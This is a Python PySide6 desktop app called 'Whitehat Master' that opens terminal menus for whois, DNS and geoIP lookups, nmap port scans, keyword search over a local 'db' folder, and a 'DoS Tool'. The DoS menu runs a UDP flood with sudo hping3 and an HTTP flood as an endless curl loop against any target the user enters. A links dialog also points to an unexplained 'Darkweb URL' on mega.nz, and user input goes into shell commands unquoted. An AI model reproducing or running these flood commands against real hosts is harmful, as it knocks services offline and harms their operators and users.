import sys
import subprocess
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QPushButton, QVBoxLayout, QWidget, QLabel, QDialog, QDialogButtonBox
)
from PySide6.QtCore import Qt
from PySide6.QtGui import QPixmap

class MultiToolApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("🆆🅷🅸🆃🅴🅷🅰🆃 🅼🅰🆂🆃🅴🆁")
        self.setGeometry(100, 100, 800, 600)

        # Set central widget
        self.central_widget = QWidget(self)
        self.setCentralWidget(self.central_widget)

        # Set the background image
        self.background_label = QLabel(self.central_widget)
        pixmap = QPixmap("background.jpg")  # Replace with your image path
        self.background_label.setPixmap(pixmap)
        self.background_label.setScaledContents(True)
        self.background_label.setGeometry(0, 0, self.width(), self.height())

        # Layout to hold all widgets
        self.layout = QVBoxLayout(self.central_widget)
        self.central_widget.setLayout(self.layout)

        # Title Label
        title = QLabel("", self.central_widget)
        title.setStyleSheet("font-size: 24px; color: #00ffcc;")
        title.setAlignment(Qt.AlignCenter)
        self.layout.addWidget(title)

        # Buttons for functionalities
        self.create_button("IP lookup", self.osint_tools)
        self.create_button("IP/Website Tools", self.scan_tools)
        self.create_button("DataBases Search", self.file_search)
        self.create_button("DoS Tool", self.dos_tool)
        self.create_button("Credits", self.developer_info)
        self.create_button("Links | Info", self.special_links)

        # Adjust z-order to ensure widgets are above the background
        self.central_widget.raise_()

    def resizeEvent(self, event):
        # Resize the background image to fit the window
        self.background_label.setGeometry(0, 0, self.width(), self.height())
        super().resizeEvent(event)

    def create_button(self, text, callback):
        button = QPushButton(text, self.central_widget)
        button.setStyleSheet("""
            QPushButton {
                background-color: #1e1e1e;
                color: white;
                border: 2px solid #00ffcc;
                padding: 10px;
                border-radius: 5px;
                font-size: 16px;
            }
            QPushButton:hover {
                background-color: #00ffcc;
                color: black;
            }
        """)
        button.clicked.connect(callback)
        self.layout.addWidget(button)

    def osint_tools(self):
        self.run_in_new_terminal([
            "bash", "-c",
            "echo -e '\033[1;36m[IP TOOLS]\033[0m'; "
            "echo '1. Whois Lookup'; "
            "echo '2. DNS Dig Query'; "
            "echo '3. Reverse DNS Lookup'; "
            "echo '4. GeoIP Location'; "
            "read -p 'Choose an option: ' choice; "
            "case $choice in "
            "  1) read -p 'Enter domain/IP: ' target; python3 -c \"import whois; print(whois.whois('$target'))\" ;; "
            "  2) read -p 'Enter domain: ' target; dig $target ;; "
            "  3) read -p 'Enter IP: ' target; dig -x $target ;; "
            "  4) read -p 'Enter IP: ' target; curl -s ipinfo.io/$target ;; "
            "  *) echo 'Invalid option' ;; "
            "esac; "
            "exec bash"
        ])

    def scan_tools(self):
        self.run_in_new_terminal([
            "bash", "-c",
            "echo -e '\033[1;32m[SCAN TOOLS]\033[0m'; "
            "echo '1. Ping Test'; "
            "echo '2. Nmap Scan'; "
            "echo '3. Port Scan'; "
            "echo '4. Trace Route'; "
            "read -p 'Choose an option: ' choice; "
            "case $choice in "
            "  1) read -p 'Enter IP/Domain: ' target; ping -c 4 $target ;; "
            "  2) read -p 'Enter IP/Domain: ' target; nmap $target ;; "
            "  3) read -p 'Enter IP/Domain: ' target; nmap -p- $target ;; "
            "  4) read -p 'Enter IP/Domain: ' target; traceroute $target ;; "
            "  *) echo 'Invalid option' ;; "
            "esac; "
            "exec bash"
        ])

    def file_search(self):
        self.run_in_new_terminal([
            "bash", "-c",
            "echo -e '\033[1;33m[DATABASES SEARCH]\033[0m'; "
            "read -p 'Enter keyword to search: ' keyword; "
            "if [[ -n \"$keyword\" ]]; then "
            "  grep -rnw ./db -e \"$keyword\" || echo 'No matches found.'; "
            "else "
            "  echo 'Error: No keyword entered. Please try again.'; "
            "fi; "
            "exec bash"
        ])

    def dos_tool(self):
        self.run_in_new_terminal([
            "bash", "-c",
            "echo -e '\033[1;31m[DOS TOOLS]\033[0m'; "
            "echo '1. UDP Flood'; "
            "echo '2. HTTP Flood'; "
            "read -p 'Choose an option: ' choice; "
            "case $choice in "
            "  1) read -p 'Enter IP: ' target; read -p 'Enter port: ' port; "
            "     sudo hping3 --udp -p $port -c 10000 $target ;; "
            "  2) read -p 'Enter URL: ' url; "
            "     while true; do curl -s $url > /dev/null; done ;; "
            "  *) echo 'Invalid option' ;; "
            "esac; "
            "exec bash"
        ])

    def developer_info(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Developer Info")
        dialog.setStyleSheet("background-color: #121212; color: white;")
        layout = QVBoxLayout(dialog)
        info_label = QLabel("Developer: Morty | Log\nDiscord: 11153133789753245664636 \nGitHub: https://github.com/LogFR01")
        info_label.setStyleSheet("font-size: 14px;")
        layout.addWidget(info_label)
        button_box = QDialogButtonBox(QDialogButtonBox.Ok)
        button_box.accepted.connect(dialog.accept)
        layout.addWidget(button_box)
        dialog.exec()

    def special_links(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Special Links")
        dialog.setStyleSheet("background-color: #121212; color: white;")
        layout = QVBoxLayout(dialog)
        links = [
            {"name": "Shodan", "url": "https://www.shodan.io"},
            {"name": "VirusTotal", "url": "https://www.virustotal.com"},
            {"name": "Whois", "url": "https://whois.com"},
            {"name": "Darkweb URL", "url": "https://mega.nz/file/qn5TVQSK#jY_12hePhAsupHi7Uy8GJ9426IcRrG76zT9CkICTVDs"},
            {"name": "HIBP", "url": "https://haveibeenpwned.com"}
        ]
        for link in links:
            label = QLabel(f"<a href='{link['url']}' style='color: #00ffcc;'>{link['name']}</a>")
            label.setOpenExternalLinks(True)
            layout.addWidget(label)
        button_box = QDialogButtonBox(QDialogButtonBox.Ok)
        button_box.accepted.connect(dialog.accept)
        layout.addWidget(button_box)
        dialog.exec()

    def run_in_new_terminal(self, command):
        try:
            # Use gnome-terminal or xterm based on availability
            subprocess.run(["gnome-terminal", "--"] + command, check=True)
        except FileNotFoundError:
            try:
                subprocess.run(["xterm", "-e"] + command, check=True)
            except FileNotFoundError:
                print("Error: No compatible terminal emulator found (gnome-terminal or xterm).")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MultiToolApp()
    window.show()
    sys.exit(app.exec())

